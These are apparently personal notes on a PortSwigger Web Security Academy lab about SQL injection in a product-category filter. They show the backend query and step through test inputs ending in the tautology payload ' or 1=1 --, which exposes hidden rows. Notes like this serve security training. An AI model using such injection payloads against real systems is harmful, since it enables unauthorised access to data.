# Lab #1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

**SQL injection - product category filter**
```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
```
**End goal:** 
- display all products both released and unreleased.

**Analysis:**
```SQL
SELECT * FROM products WHERE category = 'Pets' AND released = 1
```
```SQL
SELECT * FROM products WHERE category = ''' AND released = 1 
```
```SQL
SELECT * FROM products WHERE category = ''--' AND released = 1 
```
```SQL
SELECT * FROM products WHERE category = ''
```
```SQL
SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
```


